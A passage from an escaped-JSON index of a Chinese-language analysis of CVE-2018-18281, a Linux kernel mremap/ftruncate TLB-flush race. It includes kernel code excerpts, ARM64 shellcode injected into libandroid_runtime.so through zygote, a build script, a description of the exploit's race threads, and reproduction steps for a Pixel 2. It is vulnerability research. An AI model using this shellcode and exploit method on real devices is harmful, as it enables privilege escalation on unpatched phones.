\u8fd9\u4f1a\u5bfc\u81f4\u76ee\u6807\u6587\u4ef6\u9664\u76ee\u6807\u9875\u9762 X \u4e4b\u5916\u5176\u4ed6\u9875\u9762\u88ab\u91cd\u65b0\u88c5\u8f7d\u56de\u5185\u5b58\n\n\n4.2) \u5224\u65ad\u76ee\u6807\u9875\u9762 X \u662f\u5426\u5728\u5185\u5b58\u91cc, \u5982\u679c\u662f, \u8df3\u8f6c\u5230 3.1\n\n\n\n\n\n\n5) \u5982\u679c\u8bfb\u53d6\u5b8c\u5168\u90e8 b \u7684\u5185\u5bb9, \u76ee\u6807\u9875\u9762 X \u4ecd\u7136\u6ca1\u6709\u5728\u5185\u5b58\u91cc, \u7ed3\u675f.\n\n\n\n\n\u901a\u8fc7\u4e0a\u8ff0\u7b97\u6cd5, \u53ef\u4ee5\u8ba9\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u76ee\u6807\u9875\u9762 X \u88ab\u7f6e\u6362\u5230\u786c\u76d8, \u800c\u8be5\u6587\u4ef6\u5176\u4ed6\u9875\u9762\u4fdd\u7559\u5728\u5185\u5b58\u91cc, \u8fd9\u6837\u5728\u6f0f\u6d1e\u89e6\u53d1\u4e4b\u540e, \u518d\u6765\u8bbf\u95ee\u76ee\u6807\u9875\u9762, \u5219\u5f88\u5927\u673a\u4f1a\u4f1a\u5206\u914d\u521a\u521a\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u7ed9\u76ee\u6807\u9875\u9762\n\n\n\u6ce8\u610f:\n\nmincore \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u533a\u57df\u5185\u7684\u5185\u5b58\u662f\u5728\u7269\u7406\u5185\u5b58\u4e2d\u6216\u88ab\u4ea4\u6362\u51fa\u78c1\u76d8\n\u4e0a\u8ff0\u7b97\u6cd5\u5728 linux \u7684\u5b9e\u73b0\u4f9d\u8d56\u4e8e mincore\n\n\n\n\nb.EXP\u6e90\u7801\n\n\nexploit\u6e90\u7801\n\n\n\u4e3b\u8981\u5305\u542b\u4e0b\u9762\u51e0\u4e2a\u6587\u4ef6:\n\n\n\n\ncompile.sh\n\n\nshellcode.s\n\n\nexp.c\n\n\nwatchdog.c\n\n\n\n\ncompile.sh\n\n\n\u8fd9\u662f\u7f16\u8bd1\u811a\u672c\n\n\n1) aarch64-linux-gnu-as arm_shellcode.s -o arm_shellcode.o  \n2) aarch64-linux-gnu-ld arm_shellcode.o -o arm_shellcode \n3) aarch64-linux-gnu-objcopy --dump-section .text=arm_shellcode.bin arm_shellcode \n4) xxd -i arm_shellcode.bin > arm_shellcode.h \n5) make\n\n\n\n\n1~3 \u662f\u5c06\u6c47\u7f16\u6587\u4ef6 arm_shellcode.s \u7f16\u8bd1\u6210\u4e8c\u8fdb\u5236\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5 (.text) \u63d0\u53d6\u5230\u6587\u4ef6 arm_shellcode.bin \n\n\n4 \u4f7f\u7528 linux \u7684 xxd \u5de5\u5177\u5c06 arm_shellcode.bin \u653e\u8fdb\u4e00\u4e2a c \u8bed\u8a00\u5206\u683c\u7684\u6570\u7ec4\uff0c\u540e\u7eed\u5728 c \u4ee3\u7801\u91cc\u4ee5\u6570\u7ec4\u53d8\u91cf\u7684\u5f62\u5f0f\u64cd\u4f5c\u5b83\n\n\n5 \u6839\u636e Android.mk \u7f16\u8bd1\u53ef\u6267\u884c\u6587\u4ef6\n\n\nshellcode.s\n\n\n\u4e0b\u9762\u7b80\u5355\u770b\u4e00\u4e0b shellcode.s \u6c47\u7f16,\u4e0d\u611f\u5174\u8da3\u53ef\u4ee5\u7565\u8fc7\n\n\n\n\n\n\nshellcode.s \u672c\u8eab\u5f88\u7b80\u5355: \u8bfb\u53d6\u6587\u4ef6 \u201c/proc/self/attr/current\u201d \uff0c\u7136\u540e\u5c06\u8bfb\u53d6\u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u8c03\u7528 sethostname \u51fd\u6570\uff0c\u4ece\u800c\u66f4\u6539\u7cfb\u7edf\u7684 hostname\n\n\n\n\n\n\n\u56e0\u4e3a\u666e\u901a app \u6ca1\u6709\u6743\u9650\u8c03\u7528\u7cfb\u7edf\u51fd\u6570 'sethostname', \u672c exploit \u901a\u8fc7\u6ce8\u5165 shellcode.s \u5230 libandroid_runtime.so, \u7136\u540e\u89e6\u53d1 zygote \u8fdb\u7a0b\u6267\u884c shellcode.s \u8fbe\u5230\u8d8a\u6743\u6267\u884c\u7684\u76ee\u7684\n\n\n\n\n\n\n// open file\n_start:\nmov x0, #-100\nadrp x1, _start\n// NOTE: We are changing the page-relative alignment of the shellcode, so normal\n// aarch64 RIP-relative addressing doesn't work.\nadd x1, x1, attr_path-file_start\nmov x2, #0\nmov x8, #0x38\nsvc #0\n\nattr_path:\n.ascii \"/proc/self/attr/current\\0\"\n\n\n\n\n\u7b2c\u4e00\u6bb5\u6c47\u7f16\u4f5c\u7528\u662f open \u6587\u4ef6 \"/proc/self/attr/current\", #0x38 \u662f\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 __NR_openat (\u7cfb\u7edf\u8c03\u7528\u53f7\u5b9a\u4e49\uff1a include/uapi/asm-generic/unistd.h), \u5c06 0x38 \u653e\u5165 x8 \u5bc4\u5b58\u5668\uff0csvc #0 \u6307\u4ee4\u89e6\u53d1\u8f6f\u4e2d\u65ad\uff0c\u8fdb\u5165\u5185\u6838\u7cfb\u7edf\u8c03\u7528, \u6839\u636e openat \u51fd\u6570\u7684\u5b9a\u4e49, x1 \u5bc4\u5b58\u5668\u5b58\u653e\u8981\u6253\u5f00\u7684\u6587\u4ef6\u8def\u5f84\u7684\u5730\u5740, x0 \u548c x2 \u8fd9\u91cc\u5ffd\u7565.\n\n\n\u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e\uff0cx0\u5bc4\u5b58\u5668\u5b58\u653e\u8fd4\u56de\u503c\uff0c\u5373\u6253\u5f00\u6587\u4ef6\u7684 fd\n\n\n// read from file\nsub sp, sp, #128\nmov x1, sp\nmov x2, #128\nmov x8, #0x3f\nsvc #0\n\n\n\n\n\u7b2c\u4e8c\u6bb5\u6c47\u7f16\u6267\u884c read \u7cfb\u7edf\u8c03\u7528\uff0c\u8bfb\u53d6 128 \u5b57\u8282\u653e\u5165\u6808, #0x3f \u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 read, x0 \u5b58\u653e\u8981\u8bfb\u53d6\u6587\u4ef6\u7684 fd, x1 \u662f\u6808\u9876\u6307\u9488 sp, \u5728\u6b64\u4e4b\u524d\uff0csp \u88ab\u79fb\u52a8\u4e86#128 \u5b57\u8282\uff0c\u76f8\u5f53\u4e8e\u4e00\u4e2a 128 \u5b57\u8282\u7684\u6808\u6570\u7ec4\u4f5c\u4e3a buf\u4f20\u7ed9 read \u51fd\u6570\u7b2c\u4e8c\u4e2a\u53c2\u6570, x2 \u662f\u8981\u8bfb\u53d6\u7684\u957f\u5ea6, \u8fd9\u91cc\u662f 128\n\n\n\u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e, sp \u6307\u5411\u7684\u4f4d\u7f6e\u5b58\u653e\u6587\u4ef6 '/proc/self/attr/current' \u7684\u5185\u5bb9\n\n\n// shove file contents into hostname\nmov x1, x0\nmov x0, sp\nmov x8, #0xa1\nsvc #0\n\n\n\n\n\u7b2c\u4e09\u6bb5\u6c47\u7f16\u6267\u884c sethostname \u7cfb\u7edf\u8c03\u7528, #0xa1 \u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528 sethostname, x0 \u5373\u8981\u66f4\u65b0\u7684\u57df\u540d\u5b57\u7b26\u4e32, \u8fd9\u91cc\u653e\u5165 sp \u6307\u9488\uff0c \u5373\u5c06\u4e0a\u4e00\u6b65 read \u51fd\u6570\u8bfb\u53d6\u7684 buf \u503c\u4f5c\u4e3a sethostname \u7684\u53c2\u6570 name, x1 \u662f\u957f\u5ea6, \u8fd9\u91cc\u503c\u662f\u4e0a\u4e00\u6b65read \u7684\u8fd4\u56de\u503c\n\n\n\u8fd9\u6bb5\u6c47\u7f16\u6267\u884c\u540e, hostname \u5c06\u88ab\u66f4\u65b0\u4e3a\u6587\u4ef6 '/proc/self/attr/current' \u7684\u5185\u5bb9\n\n\nwatchdog.c\n\n\n\u8fd9\u4e2a\u6587\u4ef6\u7684\u4f5c\u7528\u662f\u4e0d\u65ad\u8c03\u7528 exp \u53ef\u6267\u884c\u6587\u4ef6\u5e76\u76d1\u63a7 exploit \u662f\u5426\u6210\u529f, \u4e4b\u6240\u4ee5\u9700\u8981\u8fd9\u4e2a\u4e3b\u8c03\u7a0b\u5e8f\u662f\u7531\u4e8e\u8fd9\u4e2a\u6f0f\u6d1e\u5728\u89e6\u53d1\u7684\u65f6\u5019, \u5927\u90e8\u5206\u60c5\u51b5\u4f1a\u5f15\u53d1\u7a0b\u5e8f\u5954\u6e83, \u8fd9\u65f6\u5019\u9700\u8981\u4e00\u4e2a\u770b\u95e8\u72d7\u7a0b\u5e8f\u4e0d\u65ad\u91cd\u542f\u5b83\n\n\nexp.c\n\n\n\u8fd9\u4e2a\u6587\u4ef6\u5b9e\u73b0\u4e86 exploit \u7684\u4e3b\u4f53\u529f\u80fd\n\n\n\n\nkickout_victim_page \u51fd\u6570\n\n\nidle_worker \u7ebf\u7a0b\n\n\nspinner \u7ebf\u7a0b\n\n\nnicer_spinner \u7ebf\u7a0b\n\n\nread_worker \u7ebf\u7a0b\n\n\nsegv_handler \u51fd\u6570\n\n\n\n\nkickout_victim_page \u51fd\u6570\u5b9e\u73b0\u4e86 \n\u5982\u4f55\u63d0\u9ad8\u6587\u4ef6 page cache \u547d\u4e2d\u7387\n \u7684\u7b97\u6cd5, \u6700\u5f00\u59cb\u6267\u884c\n\n\nidle_worker \u7ebf\u7a0b\u7528\u4e8e\u89e6\u53d1 mremap \u8c03\u7528, \u5148\u7ed1\u5b9a\u5230 c1, spinner \u5524\u9192\u540e\u91cd\u7ed1\u5b9a idle_worker \u5230 c3, \u8c03\u5ea6\u7b56\u7565\u4e3a SCHED_IDLE , \u5176\u4ed6\u7ebf\u7a0b\u90fd\u662f\u666e\u901a\u8c03\u5ea6\u7b56\u7565\n\n\nspinner \u7ebf\u7a0b\u7528\u4e8e\u89e6\u53d1 fallocate (\u8ddf ftruncate \u6548\u679c\u7c7b\u4f3c) \u8c03\u7528\u4ee5\u91ca\u653e\u7269\u7406\u9875\u9762, \u7136\u540e\u7acb\u523b\u8c03\u7528 read \u8bfb\u53d6\u76ee\u6807\u5730\u5740, \u4e89\u53d6\u8ba9\u76ee\u6807\u5730\u5740\u4f7f\u7528\u521a\u521a\u91ca\u653e\u7684\u7269\u7406\u9875\u9762\u4f5c\u4e3a page cache, \u7ed1\u5b9a\u5230 c2 \n\n\nnicer_spinner \u7ebf\u7a0b\u7ed1\u5b9a\u5230 c3, \u7528\u4e8e\u62a2\u5360 idle_worker  \u7684 cpu \u4f7f\u7528\u6743\n\n\nread_worker \u7ebf\u7a0b\u7ed1\u5b9a\u5230 c4, \u7528\u4e8e\u76d1\u63a7\u76ee\u6807\u5185\u5b58, \u4e00\u65e6\u53d1\u73b0 race \u6210\u529f\u89e6\u53d1, \u5219\u6ce8\u5165 shellcode \u5230\u76ee\u6807\u5185\u5b58\n\n\nsegv_handler \u51fd\u6570\u662f\u6bb5\u9519\u8bef\u5904\u7406\u51fd\u6570, \u8fd9\u91cc\u4f1a\u518d\u4e00\u6b21\u68c0\u6d4b shellcode \u662f\u5426\u5df2\u7ecf\u6210\u529f\u6ce8\u5165\u5230\u76ee\u6807\u6587\u4ef6, \u5982\u679c\u662f, \u5219\u901a\u77e5 watchdog \u505c\u6b62\u91cd\u542f exp\n\n\n\u6267\u884c exploit \u4e4b\u524d, libandroid_runtime.so \u5982\u4e0b\n\n\nadb pull /system/lib64/libandroid_runtime.so\n\nroot@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so \n00157000: 0871 0091 5f00 08eb c000 0054 e087 41a9  .q.._......T..A.\n00157010: e303 1f32 0800 40f9 0801 43f9 0001 3fd6  ...2..@...C...?.\n00157020: 2817 40f9 a983 5af8 1f01 09eb e110 0054  (.@...Z........T\n00157030: ff03 1191 fd7b 45a9 f44f 44a9 f657 43a9  .....{E..OD..WC.\n00157040: f85f 42a9 fa67 41a9 fc6f c6a8 c003 5fd6  ._B..gA..o...._.\n00157050: f801 00b0 d901 00b0 ba01 00f0 7b02 00f0  ............{...\n00157060: 9c01 0090  \n\n\n\n\n\u6267\u884c exploit \u4e4b\u540e, libandroid_runtime.so \u5982\u4e0b\n\n\nadb pull /system/lib64/libandroid_runtime.so\n\nroot@jiayy:CVE-2018-18281# xxd -s 0x157000 -l 100 libandroid_runtime.so \n00157000: 0000 20d4 0000 20d4 600c 8092 0100 0090  .. ... .`.......\n00157010: 2120 0191 0200 80d2 0807 80d2 0100 00d4  ! ..............\n00157020: ff03 02d1 e103 0091 0210 80d2 e807 80d2  ................\n00157030: 0100 00d4 e103 00aa e003 0091 2814 80d2  ............(...\n00157040: 0100 00d4 0000 0014 2f70 726f 632f 7365  ......../proc/se\n00157050: 6c66 2f61 7474 722f 6375 7272 656e 7400  lf/attr/current.\n00157060: eaff ff17                                ....\n\n\n\n\nc.\u590d\u73b0\u6b65\u9aa4\n\n\nIt was tested in pixel2 with fingerprint: google/walleye/walleye:9/PQ1A.181105.017.A1/5081125:user/release-keys\n\n\nrun \"sh compile.sh\" to build the exploit\nrun \"adb push libs/arm64-v8a/_exp /data/local/tmp/\"\nrun \"adb push libs/arm64-v8a/exp /data/local/tmp/\"\nadb shell to login pixel2 and run '/data/local/tmp/exp'\n\n\n\n\nd.\u5229\u7528\u539f\u7406\u7cbe\u51c6\u6982\u62ec\n\n\n\uff08\u51e0\u53e5\u8bdd\u8bf4\u6e05\u695a\u5229\u7528\u8def\u5f84\uff09\n\n\n5.\u9632\u62a4\u5efa\u8bae\n\n\n\u7ed3\u5408\u6f0f\u6d1e\u539f\u7406\u548c\u5229\u7528\u539f\u7406\uff0c\u4ece\u9632\u62a4\u4ea7\u54c1\u7814\u53d1\u7684\u89d2\u5ea6\uff0c\u63d0\u51fa\uff1a\n\n\na.\u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nb.\u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\nc.\u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e\n\n\n6.\u53c2\u8003\n\n\n\n\nmremap TLB flush too late with concurrent ftruncate\n\n\nTaking a page from the kernel's book: A TLB issue in mremap\n\n\nSwapping and the Page Cache\n\n\npatch \u8ba8\u8bba",
            "title": "Cve 2018 18281 \u5206\u6790"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#tlb-cve-2018-18281",
            "text": "",
            "title": "TLB \u7f13\u5b58\u5ef6\u8fdf\u5237\u65b0\u6f0f\u6d1e(cve-2018-18281)\u89e3\u6790"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#0",
            "text": "\uff08chengjia4574@gmail.com, iceswordlab)",
            "title": "0.\u4f5c\u8005"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#1",
            "text": "",
            "title": "1.\u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#a",
            "text": "linux kernel \u5185\u5b58\u7ba1\u7406\u5b50\u7cfb\u7edf\u7684\u6f0f\u6d1e",
            "title": "a.\u4ec0\u4e48\u8f6f\u4ef6\u7684\u6f0f\u6d1e"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#b",
            "text": "linux \u5185\u6838\u901a\u8fc7  \u591a\u7ea7\u9875\u8868  \u5b9e\u73b0\u865a\u62df\u5185\u5b58\u673a\u5236, \u4e3a\u4e86\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6, \u4e00\u4e9b\u6620\u5c04\u4fe1\u606f\u4f1a\u88ab\u7f13\u5b58\u5728  TLB  \u91cc, cpu \u5728\u8bbf\u95ee\u4e00\u4e2a\u865a\u62df\u5730\u5740\u7684\u65f6\u5019, \u4f1a\u5148\u67e5\u627e TLB , \u5982\u679c\u6ca1\u6709\u547d\u4e2d, \u624d\u53bb\u904d\u5386\u4e3b\u5b58\u91cc\u7684\u591a\u7ea7\u9875\u8868, \u5e76\u5c06\u67e5\u627e\u5230\u7684\u6620\u5c04\u5173\u7cfb\u586b\u5165 TLB  \u53cd\u8fc7\u6765, \u5982\u679c\u67d0\u4e2a\u6620\u5c04\u5173\u7cfb\u8981\u89e3\u9664, \u9664\u4e86\u5728\u4e3b\u5b58\u91cc\u7684\u76f8\u5173\u8868\u9879\u8981\u5220\u9664, \u8fd8\u9700\u8981\u5bf9\u591a\u4e2acpu core \u540c\u6b65\u6267\u884c TLB \u5237\u65b0, \u4f7f\u5f97\u5728\u6240\u6709 TLB \u7f13\u5b58\u91cc\u8be5\u6620\u5c04\u5173\u7cfb\u6d88\u9664, \u5426\u5219\u5c31\u4f1a\u51fa\u73b0\u4e0d\u4e00\u81f4.   \u672c\u6f0f\u6d1e\u5c31\u8ddf\u4e0a\u8ff0\u673a\u5236\u6709\u5173.",
            "title": "b.\u8fd9\u4e2a\u8f6f\u4ef6\u7684\u7b80\u4ecb"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#c",
            "text": "\u6743\u9650\u63d0\u5347",
            "title": "c.\u6f0f\u6d1e\u80fd\u9020\u6210\u4ec0\u4e48\u5371\u5bb3"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#d",
            "text": "mremap    ftruncate    \u591a\u7ea7\u9875\u8868  TLB  TLBs, Paging-Structure Caches, and Their Invalidation  Reverse Engineering Hardware Page Table Caches  \u4f19\u4f34\u7cfb\u7edf  \u8fdb\u7a0b\u62a2\u5360  sched_setaffinity  sched_setscheduler",
            "title": "d.\u5176\u4ed6\u5bf9\u4e86\u89e3\u6f0f\u6d1e\u6709\u5229\u7684\u80cc\u666f\u77e5\u8bc6"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#2",
            "text": "",
            "title": "2.\u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#a_1",
            "text": "linux kernel TLB \u7f13\u5b58\u6ca1\u6709\u53ca\u65f6\u5237\u65b0\u9020\u6210\u865a\u62df\u5730\u5740\u590d\u7528, \u53ef\u4ee5\u5b9e\u73b0\u8f83\u4e3a\u7a33\u5b9a\u7684\u63d0\u6743\u5229\u7528",
            "title": "a.\u6f0f\u6d1e\u539f\u7406\u7cbe\u51c6\u6982\u62ec"
        },
        {
            "location": "/kernel/cve-2018-18281-\u5206\u6790/#b_1",
            "text": "\u5148\u770b\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528   mremap  \u7cfb\u7edf\u8c03\u7528\u7528\u6765\u6539\u53d8\u865a\u62df\u5185\u5b58\u7684\u6620\u5c04\u533a\u57df  ftruncate  \u7cfb\u7edf\u8c03\u7528\u7528\u6765\u6539\u53d8\u6587\u4ef6\u7684\u5927\u5c0f\u5230\u6307\u5b9a\u5927\u5c0f   \u8fd9\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\u8868\u9762\u4e0a\u770b\u516b\u7aff\u5b50\u6253\u4e0d\u7740, \u4f46\u5728 linux \u5185\u6838\u7684\u5b9e\u73b0\u91cc, \u4ed6\u4eec\u7684\u8c03\u7528\u94fe\u6761\u4f1a\u51fa\u73b0\u4e00\u4e2a\u7ade\u6001\u6761\u4ef6\u5f02\u5e38  1) sys_mremap() -> mremap_to()->move_vma()->move_page_tables(). \nmove_page_tables() first calls move_ptes() in a loop, \nthen performs a TLB flush with flush_tlb_range().\n\n2) sys_ftruncate()->do_sys_ftruncate()->do_truncate()->notify_change()\n->shmem_setattr()->unmap_mapping_range()->unmap_mapping_range_tree()\n->unmap_mapping_range_vma() ->zap_page_range_single()->unmap_single_vma()\n->unmap_page_range()->zap_pud_range()->zap_pmd_range()->zap_pte_range()\ncan concurrently access the page tables of a process that is in move_page_tables(), \nbetween the move_ptes() loop and the TLB flush.  mremap \u5e95\u5c42\u5b9e\u73b0\u4e3b\u8981\u662f move_ptes \u51fd\u6570  89 static void move_ptes(struct vm_area_struct *vma, pmd_t *old_pmd,\n90                 unsigned long old_addr, unsigned long old_end,\n91                 struct vm_area_struct *new_vma, pmd_t *new_pmd,\n92                 unsigned long new_addr, bool need_rmap_locks)\n93 {\n94         struct address_space *mapping = NULL;\n95         struct anon_vma *anon_vma = NULL;\n96         struct mm_struct *mm = vma->vm_mm;\n97         pte_t *old_pte, *new_pte, pte;\n98         spinlock_t *old_ptl, *new_ptl;\n======================== skip ======================\n133         old_pte = pte_offset_map_lock(mm, old_pmd, old_addr, &old_ptl);\n134         new_pte = pte_offset_map(new_pmd, new_addr);\n135         new_ptl = pte_lockptr(mm, new_pmd);\n136         if (new_ptl != old_ptl)\n137                 spin_lock_nested(new_ptl, SINGLE_DEPTH_NESTING);\n138         arch_enter_lazy_mmu_mode();\n139 \n140         for (; old_addr < old_end; old_pte++, old_addr += PAGE_SIZE,\n141                                    new_pte++, new_addr += PAGE_SIZE) {\n142                 if (pte_none(*old_pte))\n143                         continue;\n144                 pte = ptep_get_and_clear(mm, old_addr, old_pte);\n145                 pte = move_pte(pte, new_vma->vm_page_prot, old_addr, new_addr);\n146                 pte = move_soft_dirty_pte(pte);\n147                 set_pte_at(mm, new_addr, new_pte, pte);\n148         }\n149 \n150         arch_leave_lazy_mmu_mode();\n151         if (new_ptl != old_ptl)\n152                 spin_unlock(new_ptl);\n153         pte_unmap(new_pte - 1);\n154         pte_unmap_unlock(old_pte - 1, old_ptl);\n155         if (anon_vma)\n156                 anon_vma_unlock_write(anon_vma);\n157         if (mapping)\n158                 i_mmap_unlock_write(mapping);\n159 }  \u7ed3\u5408\u4e0a\u9762\u4ee3\u7801, \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f   \u9501, 133 ~ 137 \u8fd9\u51e0\u884c\u76ee\u7684\u662f\u83b7\u53d6 pmd (pmd \u6307\u9488\u6307\u5411\u4e00\u4e2a\u5b58\u6ee1\u4e86 pte \u7ed3\u6784\u7684\u9875\u9762) \u7684\u9501 (\u5305\u62ec\u65e7\u7684\u548c\u65b0\u7684), 151 ~ 154 \u8fd9\u51e0\u884c\u662f\u91ca\u653e pmd \u9501  ptes \u62f7\u8d1d, \u5bf9\u4e00\u4e2a pmd \u91cc\u7684\u6240\u6709 pte \u6267\u884c\u62f7\u8d1d\u64cd\u4f5c, 144 \u8fd9\u4e00\u884c\u8c03\u7528 ptep_get_and_clear \u5c06 old_pte \u7684\u503c\u8d4b\u503c\u7ed9\u4e34\u65f6\u53d8\u91cf pte \u5e76\u6e05\u7a7a\u65e7\u7684\u9875\u8868\u9879, 147 \u8fd9\u4e00\u884c\u8c03\u7528 set_pte_at \u5c06\u521a\u521a\u7684 pte \u8d4b\u503c\u7ed9 new_pte \u6307\u9488   \u7b80\u5355\u800c\u8a00, move_ptes \u5c06\u65e7\u7684 pmd \u9875\u7684\u503c ( ptes ) \u62f7\u8d1d\u5230\u4e86\u65b0\u7684 pmd \u9875, \u8fd9\u5c31\u662f mremap \u51fd\u6570\u5728\u5e95\u5c42\u7684\u5b9e\u73b0, \u5b83\u5e76\u4e0d\u9700\u8981\u5220\u9664\u65e7\u5730\u5740\u5bf9\u5e94\u7684 pages, \u53ea\u9700\u8981\u5c06\u65e7\u5730\u5740\u5173\u8054\u5230\u7684 ptes \u62f7\u8d1d\u5230\u65b0\u5730\u5740\u5173\u8054\u7684\u9875\u8868, \u8fd9\u79cd\u62f7\u8d1d\u662f\u6309\u7167 pmd \u4e3a\u5355\u4f4d\u8fdb\u884c\u7684, \u6bcf\u5904\u7406\u5b8c\u4e00\u4e2a pmd, \u5bf9\u5e94\u7684 pmd lock \u5c31\u4f1a\u91ca\u653e.  ftruncate \u51fd\u6570\u5c06\u6587\u4ef6\u5927\u5c0f\u53d8\u4e3a\u6307\u5b9a\u7684\u5927\u5c0f, \u5982\u679c\u65b0\u7684\u503c\u6bd4\u65e7\u7684\u503c\u5c0f, \u5219\u9700\u8981\u5c06\u6587\u4ef6\u5728\u5185\u5b58\u7684\u865a\u5b58\u7a7a\u95f4\u53d8\u5c0f, \u8fd9\u9700\u8981\u8c03\u7528\u5230 zap_pte_range \u51fd\u6570  1107 static unsigned long zap_pte_range(struct mmu_gather *tlb,\n1108                                 struct vm_area_struct *vma, pmd_t *pmd,\n1109                                 unsigned long addr, unsigned long end,\n1110                                 struct zap_details *details)\n1111 {          \n1112         struct mm_struct *mm = tlb->mm;\n1113         int force_flush = 0;\n1114         int rss[NR_MM_COUNTERS];\n1115         spinlock_t *ptl;\n1116         pte_t *start_pte;\n1117         pte_t *pte;\n1118         swp_entry_t entry;\n1119 \n1120 again:\n1121         init_rss_vec(rss);\n1122         start_pte = pte_offset_map_lock(mm, pmd, addr, &ptl);\n1123         pte = start_pte;\n1124         flush_tlb_batched_pending(mm);\n1125         arch_enter_lazy_mmu_mode();\n1126         do {\n1127                 pte_t ptent = *pte;\n========================== skip ==========================\n1146                         ptent = ptep_get_and_clear_full(mm, addr, pte,\n1147                                                         tlb->fullmm);\n1148                         tlb_remove_tlb_entry(tlb, pte, addr);\n========================== skip ==========================\n1176                 entry = pte_to_swp_entry(ptent);\n========================== skip ==========================\n1185                 if (unlikely(!free_swap_and_cache(entry)))\n1186                         print_bad_pte(vma, addr, ptent, NULL);\n1187                 pte_clear_not_present_full(mm, addr, pte, tlb->fullmm);\n1188         } while (pte++, addr += PAGE_SIZE, addr != end);\n1189 \n1190         add_mm_rss_vec(mm, rss);\n1191         arch_leave_lazy_mmu_mode();\n1192 \n1193         /* Do the actual TLB flush before dropping ptl */\n1194         if (force_flush)\n1195                 tlb_flush_mmu_tlbonly(tlb);\n1196         pte_unmap_unlock(start_pte, ptl);\n========================== skip ==========================\n1212         return addr;\n1213 }  \u7ed3\u5408\u4e0a\u9762\u4ee3\u7801, \u6709\u4e09\u70b9\u9700\u8981\u6ce8\u610f,    \u9501, 1122 \u884c\u83b7\u53d6\u4e86 pmd \u7684\u9501, 1196 \u884c\u91ca\u653e\u4e86 pmd \u7684\u9501, \u8fd9\u91cc\u7684 pmd \u9501\u8ddf move_ptes \u51fd\u6570\u91cc\u7684\u662f\u540c\u4e00\u4e2a\u4e1c\u897f  pte, 1146 \u884c\u6e05\u7a7a\u4e86\u9875\u8868\u9879  page, 1185 \u884c\u8c03\u7528\u51fd\u6570 free_swap_and_cache \u91ca\u653e\u4e86 pte \u5bf9\u5e94\u7684 page cache, \u5c06\u7269\u7406\u9875\u9762\u91ca\u653e, \u8fd9\u662f\u4e0e move_ptes \u4e0d\u540c\u7684\u5730\u65b9   \u5c06\u4e0a\u8ff0\u4e24\u4e2a\u51fd\u6570\u7684\u6d41\u7a0b\u653e\u5230\u4e00\u8d77\u5206\u6790, \u5047\u8bbe\u4e0b\u9762\u8fd9\u79cd\u60c5\u51b5:  \u5047\u8bbe\u4e00\u4e2a\u8fdb\u7a0b\u6709 A,B,C \u4e09\u4e2a\u7ebf\u7a0b:   1) A \u6620\u5c04\u4e00\u4e2a\u6587\u4ef6 a \u5230\u5730\u5740 X, \u6620\u5c04\u6761\u4ef6\u4e3a: PROT_READ , MAP_SHARED  2) C \u5faa\u73af\u8bfb\u53d6 X \u7684\u5185\u5bb9  3) A \u8c03\u7528 mremap \u91cd\u65b0\u6620\u5c04 X \u5230 Y, \u8fd9\u4e2a\u8c03\u7528\u4f1a\u6267\u884c\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570:  3.1) move_ptes , \u8be5\u51fd\u6570\u505a\u5982\u4e0b\u64cd\u4f5c:  3.1.1) \u83b7\u53d6 X \u9875\u8868\u548c Y \u9875\u8868\u7684\u9501  3.1.2) \u904d\u5386 X \u5bf9\u5e94\u9875\u8868\u7684 pte , \u91ca\u653e\u4e4b, \u5e76\u5728 Y \u9875\u8868\u91cd\u5efa\u8fd9\u4e9b pte   3.1.3) \u91ca\u653e Y \u9875\u8868\u7684\u9501  3.1.4) \u91ca\u653e X \u9875\u8868\u7684\u9501    3.2) flush_tlb_range : \u5237\u65b0 X \u5bf9\u5e94\u7684 TLB \u7f13\u5b58     4) B \u8c03\u7528 ftruncate \u5c06\u6587\u4ef6 a \u7684\u6587\u4ef6\u5927\u5c0f\u6539\u4e3a 0, \u8fd9\u4e2a\u8c03\u7528\u4f1a\u6267\u884c\u4e0b\u9762\u64cd\u4f5c:  4.1) \u83b7\u53d6 Y \u9875\u8868\u7684\u9501  4.2) \u5220\u9664 Y \u5bf9\u5e94\u7684\u9875\u8868  4.3) \u91ca\u653e Y \u5bf9\u5e94\u7684 pages  4.4) \u5237\u65b0 Y \u5bf9\u5e94\u7684 TLB \u7f13\u5b58     \u8bf4\u660e: \n\n\u5b9e\u9645\u4e0a X \u548c Y \u662f\u4e24\u5757\u5185\u5b58\u533a\u57df, \u4e5f\u5c31\u662f\u8bf4\u53ef\u80fd\u6bd4\u4e00\u4e2a pmd \u6240\u5bb9\u7eb3\u7684\u5730\u5740\u8303\u56f4\u5927, \n\u4e0d\u7ba1\u662f mremap 